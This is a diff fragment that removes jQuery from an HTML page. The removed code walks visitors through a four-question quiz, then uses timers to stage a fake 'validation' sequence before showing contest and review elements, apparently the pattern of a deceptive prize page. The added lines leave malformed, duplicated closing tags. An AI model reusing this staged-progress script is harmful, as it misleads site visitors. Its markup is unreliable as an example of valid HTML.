-				$("h1").toggle()
-			}, 1500), $("#q1 .answer").click(function() {
-				$("#q1").hide(0, function() {
-					$("#q2").fadeIn()
-				})
-			}), $("#q2 .answer").click(function() {
-				$("#tq2").hide(), $("#q2").hide(0, function() {
-					$("#q3").fadeIn()
-				})
-			}), $("#q3 .answer").click(function() {
-				$("#tq3").hide(), $("#q3").hide(0, function() {
-					$("#q4").fadeIn()
-				})
-			}), $("#q4 .answer").click(function() {
-				$(".form_questions").hide(0, function() {
-					$(".validate").show(), $(".contestwrap").hide(), $("#v0a").fadeIn(), $("#v1a").fadeIn(), $("#v1b").fadeIn()
-				}), setTimeout(function() {
-					$("#v1a").hide(), $("#v1b").hide(), $("#v1c").show(), $("#v1d").show(), $("#v2a").show(), $("#v2b").show()
-				}, 2e3), setTimeout(function() {
-					$("#v2a").hide(), $("#v2b").hide(), $("#v2c").show(), $("#v2d").show(), $("#v3a").show(), $("#v3b").show()
-				}, 4500), setTimeout(function() {
-					$("#v3a").hide(), $("#v3b").hide(), $("#v3c").show(), $("#v3d").show(), $("#vfinal").show(), $("#v0a").hide(), $("#v0b").show()
-				}, 6500), setTimeout(function() {
-					$("#v4").show(), $("#v4s").show(), $(".reviews").show(), $(".validate").hide()
-				}, 6500)
-			})
-		})
-	</script>
-    
-    <script>
-function ok_btn() {
-				$('#light').css('display','block');
-	}
-  window.onload=function(){
-    $('#myModal').modal('show')
-  };
-</script>
-   <script src="bootstrap.js"></script>
-    </body></html>
+    </html>
+</body>
+
+</html>
